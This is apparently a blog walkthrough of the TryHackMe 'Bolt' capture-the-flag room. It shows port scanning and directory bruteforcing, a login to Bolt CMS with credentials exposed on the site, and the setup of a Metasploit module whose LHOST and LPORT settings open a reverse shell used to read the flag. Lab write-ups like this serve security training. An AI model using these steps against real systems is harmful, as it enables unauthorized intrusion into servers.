---
title: "THM Bolt Walkthrough"
date: 2026-03-14
categories: [TryHackMe]
tags: [ctf, web, metasploit]
toc: True
---

# Bolt

Bolt is popular TryHackMe Machine which runs on a vulnerable version of bolt and you can exploit it with just simple steps.

![Main](https://github.com/user-attachments/assets/8c284fd9-e79a-4e07-87c8-c1e914586249)

TryHackMe Machines runs on vulnerable system. It allows us to find the structure of a machine like what type of technology it is using and how can we exploit it.

We just have to join the room and then start the Machine.

Once You Start click **“Start Machine”** then you have to wait for **60 seconds** and then you will have your Machine’s IP.

![Machine IP](https://github.com/user-attachments/assets/34575995-927c-41b8-9958-83638cb9bef6)

---

## VPN Setup

Now you have to configure you VPN which you can get from:

**Manage Account → VM and VPN Setting**

Then download the configuration file.

![how to find vpn on try](https://github.com/user-attachments/assets/509e3596-ea2b-47e8-aecd-846ee684e3a4)

![how to find vpn on try1](https://github.com/user-attachments/assets/a22b0656-ee50-43f0-96c5-83ca27146ec1)

After Downloading the VPN Configuration file run this command:

```bash
sudo openvpn example.ovpn
```

![openvpn](https://github.com/user-attachments/assets/46c52062-4438-4046-9dd5-ea99857aab4d)

---

## Enumeration

The first step is to enumerate what ports are open and what kind of technology the victim is using.

For this I will use **Nmap**.

Nmap is powerful network scanning tool used to find open ports on a target system.

I will use the `-A` flag for aggressive scan.

```bash
sudo nmap -A IP
```

We got the results:

![bolt-scan-result](https://github.com/user-attachments/assets/75e8d690-95a9-4908-a710-85544166a894)

So we got some ports open.

1. Port **22** → SSH  
2. Port **80** → HTTP | Apache 2.4.29  
3. Port **8000** → HTTP | PHP 7.2.32  

Here are **8 questions** in our THM lab so I will divide it into **2 Levels**.

![Questions](https://github.com/user-attachments/assets/7199039e-ab9d-4a8d-8192-2a04a87f6def)

---

## Directory Bruteforcing

The next technique we will use to find hidden directories is called **Directory Bruteforcing**.

Directory bruteforcing is a technique used to find hidden or unprotected directories and files on a web server. It involves systematically checking a list of potential directories and filenames against the target website to discover content that may not be publicly linked or accessible.

```bash
gobuster -u http://IP:PORT -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

We didn't get anything useful.

---

# Level 1

### Q1. What port number has a web server with a CMS running?

**Ans:**

We will paste the IP address in our browser to check which server (port) is using the CMS.

```
http://IP:80
http://IP:8000
```

![bolt-homepage](https://github.com/user-attachments/assets/fa136689-3eec-4b1e-b936-6a1287d2a2a6)

After checking it we will be able to know which port is using the bolt service.

So now you have the answer of **1st Question**.

---

### Q2. What is the username we can find in the CMS?

**Ans:**

You have to check the username on the website page.

It is written on the page. Check it wisely.

---

### Q3. What is the password we can find for the username?

**Ans:**

The password is also written in the website page. Try to find and complete your question.

In the questions they have asked us about the username and password which means we may have to login using those credentials.

So I will see if the **Bolt login page** exists.

Search on Google:

```
bolt login page
```

![bolt-login](https://github.com/user-attachments/assets/089dd8f4-5e25-4456-802d-29ed291b059d)

![bolt-login1](https://github.com/user-attachments/assets/3a525cf3-576a-4879-a4af-3f106803032d)

Yeah there is a bolt login page so I will use this.

![bolt-login-panel](https://github.com/user-attachments/assets/25c66279-2857-4926-8c4a-dd1edcdc75ee)

```
http://IP:PORT/bolt/login
```

Now I will use the username and password which I got from the previous page.

I used the credentials and successfully logged in.

![bolt-login-successful](https://github.com/user-attachments/assets/1ed5f8ba-16dd-45a7-945a-01f51bd70a2b)

---

### Q4. What version of the CMS is installed on the server?

**Ans:**

Now you have to see the **lower-left corner**. It is the point where the version is written.

![bolt-version](https://github.com/user-attachments/assets/1dc52743-9e70-4303-b467-33c9a09be519)

---

# Level 2

### Q5. There's an exploit for a previous version of this CMS. Find it on Exploit DB. What's its EDB-ID?

**Ans:**

Now they are asking us to search for the previous version of CMS (bolt).

Exploit-DB is an open-source platform where developers, hackers and organizations share exploits against vulnerable systems.

Website:

```
https://www.exploit-db.com/
```

Or we can use it in Kali Linux.

First install exploitdb:

```bash
sudo apt install exploitdb
```

If you already installed it you can update it.

```bash
searchsploit -u
```

Now search the exploit.

```bash
searchsploit version
```

Write the previous version of Bolt CMS.

You will see results like this:

![bolt-previous](https://github.com/user-attachments/assets/4e3cd277-c69a-4926-826a-3688b91827d8)

Tip:  
Write only the number. Don't add `.py` extension.

---

### Q6. Metasploit recently added an exploit module for this vulnerability. What's the full path?

**Ans:**

Exploit-DB doesn't have the exploit related to the current version but **Metasploit** has it.

Metasploit Framework is a powerful open-source penetration testing tool used by security professionals and ethical hackers to identify and exploit vulnerabilities in systems.

Install or update:

```bash
sudo apt install metasploit-framework
sudo apt update
```

Launch metasploit:

```bash
msfconsole
```

Search for the exploit:

```bash
search bolt version
```

Copy the exploit path like:

```
exploit/.../.../..._..._...
```

![bolt-metasploit-location](https://github.com/user-attachments/assets/359e321a-2853-4c0f-801f-3916d15e00ef)

---

### Q7. Configure exploit options

Now configure the exploit.

**LHOST**

```bash
set LHOST IP
```

Important:  
Use the IP from **tun0**, not **eth0**, because we are connected to TryHackMe VPN.

Check with:

```bash
ip addr
```

![bolt-msf-setting](https://github.com/user-attachments/assets/b030eee1-e75c-4067-ba89-fb2ce892a7da)

**LPORT**

```bash
set LPORT 443
```

**RHOST**

```bash
set RHOST IP
```

**USERNAME**

```bash
set USERNAME <Username>
```

**PASSWORD**

```bash
set PASSWORD <Password>
```

Then run:

```bash
exploit
```

---

### Q8. Look for flag.txt

Now we have successfully exploited the machine and will look for the flag.

First list files:

```bash
ls
```

I didn't get any result because I am in a default directory.

![bolt-got-ls](https://github.com/user-attachments/assets/4097cd50-60cd-42a2-9fd9-e207e1aface5)

Example explanation:

If you are in directory `var/www/` you will only see folders under that directory.

So we change directory to root.

```bash
cd /
```

Now go to home directory.

```bash
cd home
```

List files:

```bash
ls
```

We found `flag.txt`.

Read it:

```bash
cat flag.txt
```

Flag:

```
THM{################}
```

---

## Conclusion

Congratulations on completing this room.
